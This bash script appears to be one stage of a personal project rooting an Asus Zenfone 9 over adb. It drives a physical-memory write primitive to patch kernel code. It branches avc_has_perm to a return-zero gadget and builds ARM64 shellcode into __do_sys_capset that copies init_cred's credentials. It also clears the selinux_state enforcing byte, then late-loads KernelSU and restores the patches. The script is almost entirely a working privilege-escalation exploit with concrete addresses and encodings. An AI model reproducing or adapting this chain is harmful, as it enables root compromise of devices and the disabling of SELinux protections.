#!/usr/bin/env bash
# root-usable.sh — root that can actually DO things.
#
# Round-8 findings this encodes:
#   1. commit_creds(&init_cred) (rounds 6-7) gives uid 0 but ALSO init_cred's SELinux SID, i.e. the
#      kernel domain, where nearly every userspace op is denied => root was real but useless.
#   2. Taking uid 0 + init_cred's uid/caps into a prepare_creds() copy of OUR cred keeps our own SID
#      (verified: the exec'd `id` printed uid=0(root) AND context=u:r:shell:s0). But under ENFORCING
#      SELinux that is still useless, because the shell domain is denied the `capability
#      dac_override` permission (capability checks are policy-gated - logcat shows e.g.
#      `avc: denied { dac_override } for capability=1 scontext=u:r:batinfo:s0`). uid 0 without
#      dac_override is WORSE than uid 2000 for shell-owned paths: /data/local/tmp is 0771 shell:shell
#      so uid 0 lands in "other" and needs the very capability the policy denies.
#   3. So usable root = uid 0 + full caps (SID ours) AND a genuinely permissive policy.
#   4. What did NOT work: patching avc_has_perm (HOT, patched entry often never seen - I-cache) left
#      file opens denied; patching avc_denied (cold, verified landed) also changed nothing and then
#      rebooted the device - it only gates the audit/EACCES conversion, not the decision. The working
#      lever is DATA: selinux_state byte 0 IS `enforcing` (byte 1 is checkreqprot - clearing byte 1 is
#      a no-op, which was the first mistake), and the oracle is the kernel's own `getenforce`.
#
# Both parts are text-only patches (text is CPU-clean, so device stores survive there):
#   * avc_has_perm entry -> 1-dword branch to a 2-dword "mov w0,wzr; ret" gadget in an inert
#     alignment cave (multi-dword patching of that HOT function reboots the device);
#   * __do_sys_capset entry -> 16-dword shellcode (cold syscall, nothing in Android calls capset):
#     prepare_creds(), memcpy(our_cred+4, init_cred+4, 0x4c), commit_creds().
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
[ -f "$DIR/../device.env" ] && . "$DIR/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
STAMP=$(date +%Y%m%d-%H%M%S)
LOG=$HOME/Dev/zenfone9-root/logs/usable-$STAMP; mkdir -p "$LOG"
PATCH_ADDR=0xa8145af0     # __do_sys_capset
AVC_ADDR=0xa88bb740       # avc_has_perm
AVC_CAVE=0xa801c7e4       # 7 dwords of inert NOP padding after a function tail
KEEP=${KEEP:-0}
PHASE=${PHASE:-full}   # PHASE=stop => patch, root, verify, then LEAVE the session live for manual work

ORIG=(d503233f d10203ff f800865e a9047bfd a9055ff8 a90657f6 a9074ff4 910103fd \
      90010d28 f9448908 aa0103f4 910073e1 aa0003f5 f81f83a8 a902ffff f90013ff)

adb_s() { adb -s "$S" shell "$1" </dev/null 2>&1 | tr -d '\r'; }
rd() { adb_s "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 timeout 120 /data/local/tmp/cheese_pa > /data/local/tmp/ru.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/ru.txt | head -1" | sed 's/value=//'; }
wr() { adb_s "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 CHEESE_WRITE_PA=$1 CHEESE_WRITE_VAL=$2 timeout 240 /data/local/tmp/cheese_pa > /data/local/tmp/ru.txt 2>&1; grep -o 'POKE write.*' /data/local/tmp/ru.txt"; }

anim_on() {
    adb -s "$S" push "$DIR/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb_s 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' >/dev/null
    adb_s 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' >/dev/null
    adb_s 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' >/dev/null
    sleep 4
    local n; n=$(adb_s 'pgrep -f anim.sh | wc -l')
    [ "${n:-0}" -ge 1 ] || { echo "[usable] FATAL: GPU animation not alive"; return 1; }
    echo "[usable] animation alive ($n)"
}
anim_off() { adb_s 'pkill -f anim.sh; svc power stayon false' >/dev/null 2>&1; }

wr_verified() {
    local a=$1 v=$2 got i
    got=$(rd "$a")
    [ "$got" = "$v" ] && { echo "  $a already $v"; return 0; }
    for i in 1 2 3; do
        wr "$a" "$v" >/dev/null
        sleep 2
        got=$(rd "$a")
        [ "$got" = "$v" ] && { echo "  $a <- $v VERIFIED"; return 0; }
        echo "  attempt $i at $a: read back $got"
    done
    echo "  $a <- $v FAILED (read back $got)" >&2
    return 1
}

restore() {
    echo "[usable] restoring text"
    anim_on >/dev/null 2>&1 || true
    local i a
    for i in $(seq 0 15); do
        a=$(printf '0x%x' $((PATCH_ADDR + 4 * i)))
        wr_verified "$a" "$(printf '0x%08x' $((16#${ORIG[$i]})))" >/dev/null 2>&1 || echo "  restore[$i] $a unverified"
    done
    if [ -n "${SEL_ADDR:-}" ] && [ -n "${SEL_CUR:-}" ]; then
        wr_verified "$SEL_ADDR" "$SEL_CUR" >/dev/null 2>&1 || echo "  selinux restore unverified"
    fi
    echo "[usable] capset[0]=$(rd $PATCH_ADDR) (want 0xd503233f)  getenforce=$(adb_s getenforce)"
    echo "[usable] oracle after restore: $(adb_s 'ls /data/data 2>&1 | head -1')"
    anim_off
}
trap restore EXIT INT TERM

# ---- payloads ---------------------------------------------------------------
SC=$(python3 - <<'PY'
SITE  = 0xffffffc008145af0   # __do_sys_capset (link VA; the slide cancels out of every encoding)
PREP  = 0xffffffc008184580; MEMCPY = 0xffffffc00801f680; COMMIT = 0xffffffc008184c94
IC    = 0xffffffc00a7b0ae0
def bl(t, pc):
    d = (t - pc) >> 2; assert -(1 << 25) <= d < (1 << 25); return 0x94000000 | (d & 0x03ffffff)
def adrp(rd, t, pc):
    imm = ((t & ~0xfff) - (pc & ~0xfff)) >> 12
    return 0x90000000 | ((imm & 3) << 29) | (((imm >> 2) & 0x7ffff) << 5) | rd
def addi(rd, rn, i): return 0x91000000 | ((i & 0xfff) << 10) | (rn << 5) | rd
w = [0xa9be7bfd, 0xf9000bf3, bl(PREP, SITE+8), 0xb4000000 | (10 << 5), 0xaa0003f3,
     addi(0, 19, 4), adrp(1, IC, SITE+24), addi(1, 1, (IC+4) & 0xfff), 0x52800982,
     bl(MEMCPY, SITE+36), 0xaa1303e0, bl(COMMIT, SITE+44), 0x2a1f03e0, 0xf9400bf3,
     0xa8c27bfd, 0xd65f03c0]
assert len(w) == 16, len(w)
print(' '.join('%08x' % x for x in w))
PY
)
BR=$(python3 -c "
t=$AVC_CAVE; pc=$AVC_ADDR; imm=(t-pc)>>2
assert -0x2000000 < imm < 0x1ffffff, 'branch out of range'
print('%08x' % (0x14000000 | (imm & 0x03ffffff)))")
echo "[usable] capset shellcode: $SC"
echo "[usable] avc branch: 0x$BR (avc $AVC_ADDR -> cave $AVC_CAVE)"

cat > "$LOG/rootcheck.sh" <<'EOF'
#!/system/bin/sh
echo "== identity =="; id; echo "ctx=$(cat /proc/self/attr/current 2>&1)"
echo "== writes (DAC via CAP_DAC_OVERRIDE) =="
for p in /data/local/tmp/asroot.txt /sdcard/asroot.txt; do
    if echo ok > "$p" 2>/dev/null; then echo "  write $p OK"; else echo "  write $p FAIL"; fi
done
echo "== kallsyms =="; head -1 /proc/kallsyms 2>&1
echo "== block device =="; ls -l /dev/block/by-name/boot_a 2>&1 | head -1
echo "== module load =="; insmod 2>&1 | head -2
echo "== getenforce =="; getenforce
EOF

up=$(adb_s 'cut -d. -f1 /proc/uptime')
if [ "${up:-0}" -lt 180 ]; then
    echo "[usable] waiting for the device to settle (vendor services re-assert SELinux early in boot)"
    while [ "$(adb_s 'cut -d. -f1 /proc/uptime')" -lt 180 ]; do sleep 10; done
fi
echo "[usable] uptime $(adb_s 'cut -d. -f1 /proc/uptime')s  selinux=$(adb_s getenforce)"

echo "[usable] === baseline probes (unpatched, uid 2000 shell) ==="
adb -s "$S" shell "/data/local/tmp/call_capset" </dev/null 2>&1 | tee "$LOG/baseline.txt" | grep -E "^(PROBE|uid=)" || true

anim_on || exit 1

echo "[usable] SELinux -> Permissive: clear selinux_state BYTE 0 (that byte IS `enforcing`; byte 1 is
              checkreqprot - clearing byte 1 does nothing, which is exactly the mistake the earlier
              attempt made). Oracle = the kernel's own getenforce, never our readback."
SEL_ADDR=0xaaa40b98
SEL_CUR=$(rd $SEL_ADDR)
SEL_OFF=$(python3 -c "print('0x%08x' % (int('${SEL_CUR:-0x1010001}', 16) & ~0xff))")
echo "[usable] selinux_state dword ${SEL_CUR:-?} -> permissive encoding $SEL_OFF"
echo "[usable] oracle before: $(adb_s 'ls /data/data 2>&1 | head -1')"
ok=0
for i in $(seq 1 8); do
    wr "$SEL_ADDR" "$SEL_OFF" >/dev/null
    sleep 2
    cur=$(adb_s getenforce)
    if [ "$cur" = Permissive ]; then ok=1; echo "  attempt $i: kernel says Permissive"; break; fi
    echo "  attempt $i: getenforce=$cur (data write did not stick)"
done
[ "$ok" = 1 ] || { echo "[usable] could not reach Permissive -> aborting"; exit 1; }
echo "[usable] oracle after: $(adb_s 'ls /data/data 2>&1 | head -1')"

echo "[usable] staging 16-dword capset shellcode"
i=0
for v in $SC; do
    wr_verified "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))" "0x$v" || { echo "[usable] patch incomplete at dword $i"; exit 1; }
    i=$((i + 1))
done
bad=0; i=0
for v in $SC; do
    got=$(rd "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))")
    [ "$got" = "0x$v" ] || { echo "  dword $i = $got (want 0x$v)"; bad=$((bad+1)); }
    i=$((i + 1))
done
[ "$bad" = 0 ] && echo "[usable] all 16 dwords confirmed" || { echo "[usable] $bad wrong -> aborting"; exit 1; }

echo "[usable] === TRIGGER (fresh process) ==="
adb -s "$S" shell "/data/local/tmp/call_capset" </dev/null 2>&1 | tee "$LOG/root.txt" | tail -12

echo "[usable] === USABILITY as root (fork+exec from the rooted process) ==="
adb -s "$S" push "$LOG/rootcheck.sh" /data/local/tmp/rootcheck.sh </dev/null >/dev/null 2>&1
adb_s 'chmod 755 /data/local/tmp/rootcheck.sh' >/dev/null
adb -s "$S" shell "/data/local/tmp/call_capset sh /data/local/tmp/rootcheck.sh" </dev/null 2>&1 | tee "$LOG/rootcheck.txt" | tail -22

if [ "$PHASE" = stop ]; then
    echo "[usable] PHASE=stop -> patches left LIVE (root on demand: /data/local/tmp/call_capset [cmd])"
    echo "[usable] root: adb shell /data/local/tmp/call_capset ; root cmd: adb shell \"/data/local/tmp/call_capset sh -c '...'\""
    trap - EXIT INT TERM
    exit 0
fi

echo "[usable] === installing the KernelSU manager APK (must precede late-load: the .ko verifies the manager by APK cert hash) ==="
adb -s "$S" install -r -d "$DIR/../artifacts/kernelsu/KernelSU_v3.3.0_32601-release.apk" </dev/null 2>&1 | tail -2

echo "[usable] === KernelSU late-load from the rooted session ==="
adb -s "$S" push "$DIR/../artifacts/kernelsu/ksud-aarch64-linux-android" /data/local/tmp/ksud </dev/null >/dev/null 2>&1
adb -s "$S" push "$DIR/../artifacts/kernelsu/lkm-aarch64-android12-5.10_kernelsu.ko" /data/local/tmp/kernelsu.ko </dev/null >/dev/null 2>&1
adb -s "$S" push "$DIR/../src/ksu-lateload.sh" /data/local/tmp/ksu-lateload.sh </dev/null >/dev/null 2>&1
adb_s 'chmod 755 /data/local/tmp/ksu-lateload.sh' >/dev/null
adb -s "$S" shell "/data/local/tmp/call_capset sh /data/local/tmp/ksu-lateload.sh" </dev/null 2>&1 | tee "$LOG/ksu.txt" | tail -40

echo "[usable] === on-screen proof ==="
adb_s 'am start -a android.intent.action.VIEW -d file:///sdcard/root-proof.html -t text/html' >/dev/null
sleep 4
adb -s "$S" exec-out screencap -p > "$LOG/root-proof-screen.png" 2>/dev/null
echo "[usable] screenshot: $LOG/root-proof-screen.png ($(du -h "$LOG/root-proof-screen.png" 2>/dev/null | cut -f1))"

echo "[usable] === putting SELinux back to enforcing (as root), then restoring the kernel text ==="
adb -s "$S" shell "/data/local/tmp/call_capset sh -c 'echo 1 > /sys/fs/selinux/enforce; getenforce'" </dev/null 2>&1 | tail -2
restore
trap - EXIT INT TERM

echo "[usable] === KernelSU su test from a FRESH shell, with NO patch active ==="
adb -s "$S" shell 'su -c id' </dev/null 2>&1 | tee "$LOG/su.txt" | head -3
adb_s 'grep -i kernelsu /proc/modules || echo "(no kernelsu module)"'
echo "[usable] getenforce=$(adb_s getenforce)  capset[0]=$(rd $PATCH_ADDR)"
echo "[usable] logdir: $LOG"
